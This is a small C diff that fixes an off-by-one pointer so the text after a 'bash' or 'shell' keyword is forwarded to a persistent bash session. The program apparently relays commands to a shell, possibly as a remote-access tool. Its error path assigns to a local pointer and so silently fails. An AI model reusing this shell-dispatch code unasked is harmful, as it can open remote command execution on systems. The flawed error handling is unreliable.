@@ -64,7 +64,7 @@ int processing(char* inp, char* outp, int* outp_len){
 	memset(outp, 0, *outp_len);
 	if (!strcmp(inp, "bash")||!strcmp(inp, "shell")){
 		if (bash_session_fd>=0)
-			Bash(bash_session_fd, &inp[strlen(inp)], outp, outp_len);
+			Bash(bash_session_fd, &inp[strlen(inp)+1], outp, outp_len);
 		else{
 			if ((bash_session_fd=bashInit())<0){
 				outp = "Unable to create bash session";
